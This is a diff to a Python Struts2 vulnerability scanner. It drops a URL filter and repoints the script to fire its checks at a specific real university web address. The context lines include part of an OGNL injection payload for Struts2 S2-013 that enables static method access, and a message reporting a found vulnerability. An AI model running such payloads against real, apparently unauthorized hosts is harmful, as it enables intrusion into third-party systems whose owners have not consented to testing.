@@ -8,19 +8,9 @@ from urllib.parse import urlparse
 
 
 class Struts2:
-    def __init__(self, targets):
-        self.targets = targets
-        self.urls = []
+    def __init__(self, urls):
+        self.urls = urls
         self.url = ''
-
-    def filter(self):
-        pattern = re.compile(".*?\.action.*|.*?\.do.*")
-        for url in self.targets:
-            if re.match(pattern, url):
-                if '?' in url:
-                    self.urls.append(url.split('?')[0])
-                else:
-                    self.urls.append(url)
 
     def struts2_013(self):
         exp = '''?a=${(%23_memberAccess["allowStaticMethodAccess"]=true,%23req=@org.apache.struts2.ServletActionContext
@@ -123,16 +113,12 @@ class Struts2:
             print('存在漏洞: %s : %s' % (r, self.url))
 
     def run(self):
-        self.filter()
         if self.urls:
             for url in self.urls:
                 self.url = url
                 self.struts2()
 
-    def main(self):
-        self.url = 'https://butian.360.cn/srcNav'
-        self.struts2()
 
 if __name__ == '__main__':
-    s = Struts2('')
-    s.main()
+    Struts2(['http://e.njutcm.edu.cn/thesis/index.do']).run()
+
